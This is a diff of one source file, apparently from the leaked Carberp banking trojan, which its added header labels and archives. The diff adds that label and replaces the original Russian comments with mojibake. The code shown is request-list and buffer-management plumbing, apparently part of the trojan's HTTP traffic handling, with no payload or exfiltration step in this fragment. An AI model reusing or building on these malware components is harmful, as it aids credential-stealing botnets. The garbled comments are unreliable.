@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #include "Requests.h"
@@ -11,7 +22,7 @@ void FreeRequest(PRequest R);
 
 PRequestList Request::CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFreeExtData)
 {
-	// Создаёт список запросов
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PRequestList List = CreateStruct(TRequestList);
 	if (List == NULL)
 		return NULL;
@@ -30,7 +41,7 @@ PRequestList Request::CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFr
 
 void Request::FreeList(PRequestList List)
 {
-	// Уничтожить список запросов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (List == NULL)
 		return;
 	List::Free(List->Items);
@@ -42,7 +53,7 @@ void Request::FreeList(PRequestList List)
 
 void FreeRequest(PRequest R)
 {
-	// Уничтожаем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	Request::Clear(R);
 	FreeStruct(R);
@@ -50,12 +61,12 @@ void FreeRequest(PRequest R)
 
 void Request::Clear(PRequest R)
 {
-	// Очистить запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (R->List->OnFreeExtData != NULL)
 		R->List->OnFreeExtData(R);
 
-	// Уничтожаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	R->Method = hmUnknown;
 	STR::Free(R->URL);
@@ -74,14 +85,14 @@ void Request::Clear(PRequest R)
 	if (R->ReceiveList != NULL)
 		MEMBLOCK::FreeList(R->ReceiveList);
 
-	//  Сохраняем обязательные данные
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	LPVOID OldOwner = R->Owner;
 	PRequestList OldList =  R->List;
 
-	// Очищаем структуру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memset(R, 0, sizeof(TRequest));
 
-	// Восстанавливаем обязательные данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	R->Owner = OldOwner;
     R->List = OldList;
 }
@@ -91,7 +102,7 @@ void Request::Clear(PRequest R)
 PRequest Request::Find(PRequestList List, LPVOID Owner)
 {
 
-	// Найти запрос для владельца
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (List == NULL)
 		return NULL;
 	Request::Lock(List);
@@ -114,8 +125,8 @@ PRequest Request::Find(PRequestList List, LPVOID Owner)
 
 PRequest Request::Add(PRequestList List, LPVOID Owner, bool *Existed)
 {
-	// Добавить запрос. Если запрос для владельца Owner существует, то будет
-	// возвращён указатель на него
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Owner пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (List == NULL)
 		return NULL;
 
@@ -124,7 +135,7 @@ PRequest Request::Add(PRequestList List, LPVOID Owner, bool *Existed)
 	PRequest R = Request::Find(List, Owner);
 	if (R == NULL)
 	{
-		// Запрос отсутствует. Добавляем
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		R = CreateStruct(TRequest);
 		if (Existed != NULL)
 			*Existed = R != NULL;
@@ -146,7 +157,7 @@ PRequest Request::Add(PRequestList List, LPVOID Owner, bool *Existed)
 
 DWORD Request::Delete(PRequestList List, LPVOID Owner)
 {
-	// Удалить запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (List == NULL)
 		return false;
 	Request::Lock(List);
@@ -172,22 +183,22 @@ DWORD Request::Delete(PRequestList List, LPVOID Owner)
 
 DWORD Request::GetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf)
 {
-	// Получить следующую порцию данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Request == NULL || Request->Buffer == NULL)
 		return 0;
 
 	int Max = Request->BufferSize - Request->Position;
 	if (Max < 0) Max = 0;
-	// Если не указан буфер или размер буфера, то возвращаем
-	// объём доступных данных
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL || BufSize == 0)
 		return Max;
 
-	// Больше нет данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Max > 0)
 	{
-		// Выдаём данные
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if ((DWORD)Max > BufSize)
 			Max = BufSize;
 		m_memcpy(Buf, (PCHAR)Request->Buffer + Request->Position, Max);
@@ -236,12 +247,12 @@ void Request::SetBuffer(PRequest R, LPBYTE NewBuf, DWORD Size)
 
 
 //----------------------------------------------------------------------------
-//  Request - Набор функция для работы с запросами
+//  Request - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //----------------------------------------------------------------------------
 
 void Request::InitializeReceiveData(PRequest R)
 {
-	// Инициализировать данные для загрузки документа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (R == NULL) return;
 
 	if (R->ReceiveList == NULL)
@@ -258,13 +269,13 @@ void Request::InitializeReceiveData(PRequest R)
 
 void Request::CloseReceiveData(PRequest R)
 {
-	// функция собирает загруженные данные ф буфер запроса
-	// и освобождает выделенные для загрузки структуры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (R == NULL) return;
 	MEMBLOCK::FreeBlock(R->ReceiveBuf);
 	R->ReceiveBuf = NULL;
 
-	// Собираем загруженные данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (R->ReceiveList != NULL)
 	{
 		DWORD Sz;
